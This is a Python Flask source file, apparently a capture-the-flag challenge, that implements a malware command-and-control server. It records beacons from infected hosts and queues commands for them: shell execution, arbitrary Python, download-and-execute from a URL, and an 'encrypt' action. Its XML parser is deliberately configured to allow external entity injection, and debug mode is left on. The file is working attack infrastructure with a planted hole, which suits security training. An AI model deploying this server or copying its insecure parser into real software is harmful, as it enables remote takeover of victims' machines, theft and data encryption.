#!/usr/bin/python3
# APT213: A not so stealthy operation...
# Author: Hafidh Zouahi (hfz)

# Temporary application to handle the C2 agents, a lot
# of the code here is poorly written and is subject to
# change in the future. Anyways, as long as no one
# discovers the C2 agent and reverse engineers it, this
# application will remain secretive, plus there is no way
# someone retrieves the application secrets I guess, so
# we are good.
# Actually fuck it, I am gonna leave it as is, no time to
# code something better, we already have a lot of more
# important tasks to do, we do not have a UI that makes use
# of the exposed API yet, and it makes me sick to use curl
# everytime I need to communicate with an agent...

from flask import Flask, Response, request, jsonify
from lxml.etree import XMLParser, fromstring as validate_xml, XMLSyntaxError
from hostmanager import HostManager
from functools import wraps
from datetime import datetime, timedelta
import jwt
import os

app = Flask(__name__)
app.config.from_pyfile("config.cfg")

# TODO: uncomment the following line when all the testing is done
# app.config["DEBUG"] = False

hostmgr = HostManager(app.config.get("DB_FILE"))

# Because I had to spend hours looking for a way to introduce a
# vulnerability somewhere
xml_parser = XMLParser(no_network=False, load_dtd=True, huge_tree=True)

# <------------------------------- Decorators ------------------------------->
def user_agent_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.headers.get("User-Agent") != app.config.get("USER_AGENT"):
            return (
                Response(
                    "<error>Unrecognized agent</error>", mimetype="application/xml"
                ),
                401,
            )

        return f(*args, **kwargs)

    return decorated_function


def jwt_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get("Authorization")

        if token is None:
            return jsonify({"error": "Bearer token is missing"}), 401

        token = token.split()[-1]

        try:
            jwt.decode(token, app.config["SECRET_KEY"])
        except:
            return jsonify({"error": "Invalid token"}), 401

        return f(*args, **kwargs)

    return decorated_function


def accept_xml_only(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.headers.get("Content-type") not in ["text/xml", "application/xml"]:
            return (
                Response(
                    "<error>Only XML is supported</error>", mimetype="application/xml"
                ),
                400,
            )

        return f(*args, **kwargs)

    return decorated_function


# <--------------------- endpoints used by the C2 Agents --------------------->
# Since the requests are coming from our precious agents who do not make
# mistakes, doing more checks on the XML data structure would be overkill.
@app.route("/beacon", methods=["POST"])
@user_agent_required
@accept_xml_only
def handle_beacon():
    xml_data = request.data

    xml_parser.feed(xml_data)
    xml_data = xml_parser.close()

    lastseen = xml_data.xpath("./Time/text()")[0]
    username = xml_data.xpath("./CurrentUser/text()")[0]
    hostname = xml_data.xpath("./HostName/text()")[0]
    internalip = xml_data.xpath("./InternalIP/text()")[0]
    externalip = xml_data.xpath("./ExternalIP/text()")[0]

    exists, action = hostmgr.host_exists(username=username, hostname=hostname)
    if exists:
        hostmgr.update_host(lastseen, username, hostname)
        return Response(action, mimetype="application/xml")
    else:
        hostmgr.add_host(lastseen, username, hostname, internalip, externalip)
        return ""


@app.route("/response", methods=["POST"])
@user_agent_required
@accept_xml_only
def handle_response():
    xml_data = request.data

    xml_parser.feed(xml_data)
    xml_data = xml_parser.close()

    username = xml_data.xpath("./CurrentUser/text()")[0]
    hostname = xml_data.xpath("./HostName/text()")[0]
    output = xml_data.xpath("./Output/text()")

    hostmgr.set_response(username, hostname, output)

    return ""


# <----------------------- endpoints used by the C2 UI ----------------------->
@app.route("/auth", methods=["POST"])
def authenticate():
    data = request.get_json()

    if not data or not "username" in data or not "password" in data:
        return jsonify({"error": "username and password are required"}), 400

    elif data["username"] == app.config.get("USERNAME") and data[
        "password"
    ] == app.config.get("PASSWORD"):
        token = jwt.encode(
            {
                "username": data["username"],
                "exp": datetime.utcnow() + timedelta(minutes=60),
            },
            app.config["SECRET_KEY"],
        ).decode()

        return jsonify({"success": token})
    else:
        return jsonify({"error": "Access denied"}), 401


@app.route("/hosts", methods=["GET"])
@jwt_required
def fetch_all_hosts():
    hosts = hostmgr.get_all_hosts()
    code = 404 if "error" in hosts else 200

    return jsonify(hosts), code


@app.route("/host/<host_id>", methods=["GET"])
@jwt_required
def fetch_host(host_id):
    host = hostmgr.get_host(host_id)
    code = 404 if "error" in host else 200

    return jsonify(host), code


@app.route("/host/<host_id>/<attribute>", methods=["GET"])
@jwt_required
def fetch_host_attribute(host_id, attribute):
    value = hostmgr.get_attribute(host_id, attribute)
    code = 200 if value else 404

    value = value if value else "not found"

    return value, code


@app.route("/c2/<action>", methods=["POST"])
@jwt_required
def command_and_control(action):
    data = request.get_json()
    param = None
    if not data:
        return jsonify({"error": "no data provided"}), 400

    err_msg = jsonify({"error": "missing parameters"}), 400
    if action == "sleep":
        if not "id" in data or not "interval" in data:
            return err_msg
        param = data["interval"]

    elif action == "runcmd":
        if not "id" in data or not "cmd" in data:
            return err_msg
        param = data["cmd"]

    elif action == "runpy":
        if not "id" in data or not "code" in data:
            return err_msg
        param = data["code"]

    elif action == "dlexec":
        if not "id" in data or not "url" in data:
            return err_msg
        param = data["url"]

    elif action == "encrypt":
        if not "id" in data:
            return err_msg

    else:
        return jsonify({"error": "no such action"}), 404

    success = hostmgr.set_action(data["id"], action, param)
    code = 200 if success else 404

    return jsonify({"success": success}), code


# <--------------------------------------------------------------------------->


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
